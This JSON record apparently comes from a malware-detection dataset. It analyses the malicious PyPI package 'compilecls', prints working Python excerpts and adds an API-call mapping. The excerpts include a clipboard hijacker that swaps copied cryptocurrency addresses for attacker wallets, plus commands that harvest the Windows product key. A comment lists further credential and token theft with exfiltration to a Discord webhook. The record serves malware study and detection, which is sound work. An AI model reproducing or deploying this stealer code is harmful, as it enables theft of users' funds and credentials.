[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/compilecls-1.0.4-py3-none-any/compilecls/__init__.py",
    "code_snippet": "import asyncio\nimport json\nimport ntpath\nimport os\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport httpx\nimport psutil\nimport base64\nimport requests\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\n\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# ... (config and global variables omitted for brevity)\n\nclass Functions(object):\n    # ... (other methods omitted)\n    @staticmethod\n    def info_sys() -> list:\n        flag = 0x08000000\n        sh1 = \"wmic csproduct get uuid\"\n        sh2 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\"\n        sh3 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName\"\n        try:\n            windows_uuid = (\n                subprocess.check_output(sh1, creationflags=flag)\n                .decode()\n                .split(\"\\n\")[1]\n                .strip()\n            )\n        except Exception:\n            windows_uuid = \"N/A\"\n        try:\n            key_windows_find = (\n                subprocess.check_output(sh2, creationflags=flag).decode().rstrip()\n            )\n        except Exception:\n            key_windows_find = \"N/A\"\n        try:\n            never_wind = (\n                subprocess.check_output(sh3, creationflags=flag).decode().rstrip()\n            )\n        except Exception:\n            never_wind = \"N/A\"\n        return [windows_uuid, never_wind, key_windows_find]\n\nclass auto_copy_wallet(Functions):\n    def __init__(self):\n        self.address_st3aler = self.find_in_config(\"addresse_crypto_replacer\")\n        self.address_btc = self.find_in_config(\"addresse_btc\")\n        self.address_eth = self.find_in_config(\"addresse_eth\")\n        self.address_xchain = self.find_in_config(\"addresse_xchain\")\n        self.address_pchain = self.find_in_config(\"addresse_pchain\")\n        self.address_cchain = self.find_in_config(\"addresse_cchain\")\n        self.address_monero = self.find_in_config(\"addresse_monero\")\n        self.address_ada = self.find_in_config(\"addresse_ada\")\n        self.address_dash = self.find_in_config(\"addresse_dash\")\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search(\"^0x[a-fA-F0-9]{40}$\", clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search(\n                \"^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search(\"addr1[a-z0-9]+\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search(\"/X[1-9A-HJ-NP-Za-km-z]{33}$/g\", clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search(\"/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g\", clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n\n    def loop_through(self):\n        while True:\n            self.address_swap()\n\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# ... (first_function_bc class omitted for brevity, but is malicious)\n# ... (NoDebugg class omitted for brevity, but is malicious)\n\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(first_function_bc().init())\n\n# ... (DATA_BLOB, CryptUnprotectData, Value_Dcryptage, Requests_loading, URL_librairy_Loading, Trust, Reformat, upload, writeforfile, NotPSSW, Find_Passw, Cookies, Get_Bc_Cook, checkIfProcessRunning, ZipMyThings, bc_Gather_All, UploadTo_Anon, CreateFolder_, bc_create_file, check_spec_bc, keyword, cookiWords, paswWords, bc_Gather_All, DETECTED, wikith, filetext, upload, auto_copy_wallet().run, etc. are all malicious)\n\n# The following is a summary of the core malicious behaviors:\n# - Steals browser passwords, cookies, credit cards, Discord tokens, Minecraft and Roblox credentials\n# - Takes screenshots\n# - Exfiltrates all stolen data to a Discord webhook and/or transfer.sh\n# - Zips and uploads files from Desktop, Documents, Downloads containing sensitive keywords\n# - Installs itself for persistence (startup)\n# - Injects code into Discord for further token stealing\n# - Kills Discord and security-related processes\n# - Clipboard hijacking for crypto addresses\n# - Anti-debug/anti-VM checks\n# - Uses obfuscated/encoded payloads and network requests\n# - Uses threading and async to parallelize data theft and exfiltration\n# - Uses Windows APIs for decryption and system info\n# - All code is tightly coupled and required for the full malicious operation\n",
    "pattern_analysis": {
      "api_sequence": [
        "subprocess.check_output",
        "subprocess.check_output",
        "subprocess.check_output",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste"
      ],
      "api_sequence_with_args": [
        "subprocess.check_output(sh1, creationflags=flag)",
        "subprocess.check_output(sh2, creationflags=flag)",
        "subprocess.check_output(sh3, creationflags=flag)",
        "pyperclip.paste()",
        "re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data)",
        "pyperclip.copy(self.address_btc)",
        "pyperclip.paste()",
        "re.search(\"^0x[a-fA-F0-9]{40}$\", clipboard_data)",
        "pyperclip.copy(self.address_eth)",
        "pyperclip.paste()",
        "re.search(\"^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\", clipboard_data)",
        "pyperclip.copy(self.address_xchain)",
        "pyperclip.paste()",
        "re.search(\"^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\", clipboard_data)",
        "pyperclip.copy(self.address_pchain)",
        "pyperclip.paste()",
        "re.search(\"^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\", clipboard_data)",
        "pyperclip.copy(self.address_cchain)",
        "pyperclip.paste()",
        "re.search(\"addr1[a-z0-9]+\", clipboard_data)",
        "pyperclip.copy(self.address_ada)",
        "pyperclip.paste()",
        "re.search(\"/X[1-9A-HJ-NP-Za-km-z]{33}$/g\", clipboard_data)",
        "pyperclip.copy(self.address_dash)",
        "pyperclip.paste()",
        "re.search(\"/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g\", clipboard_data)",
        "pyperclip.copy(self.address_monero)",
        "pyperclip.paste()"
      ],
      "mapped_sequence": [
        {
          "api_name": "subprocess.check_output",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.check_output",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.check_output",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        }
      ],
      "contextual_code": "import subprocess\nimport re\nimport pyperclip\n\nclass Functions(object):\n    @staticmethod\n    def info_sys() -> list:\n        flag = 0x08000000\n        sh1 = \"wmic csproduct get uuid\"\n        sh2 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\"\n        sh3 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName\"\n        try:\n            windows_uuid = (\n                subprocess.check_output(sh1, creationflags=flag)\n                .decode()\n                .split(\"\\n\")[1]\n                .strip()\n            )\n        except Exception:\n            windows_uuid = \"N/A\"\n        try:\n            key_windows_find = (\n                subprocess.check_output(sh2, creationflags=flag).decode().rstrip()\n            )\n        except Exception:\n            key_windows_find = \"N/A\"\n        try:\n            never_wind = (\n                subprocess.check_output(sh3, creationflags=flag).decode().rstrip()\n            )\n        except Exception:\n            never_wind = \"N/A\"\n        return [windows_uuid, never_wind, key_windows_find]\n\nclass auto_copy_wallet(Functions):\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search(\"^0x[a-fA-F0-9]{40}$\", clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search(\n                \"^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search(\"addr1[a-z0-9]+\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search(\"/X[1-9A-HJ-NP-Za-km-z]{33}$/g\", clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search(\"/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g\", clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None"
    }
  }
]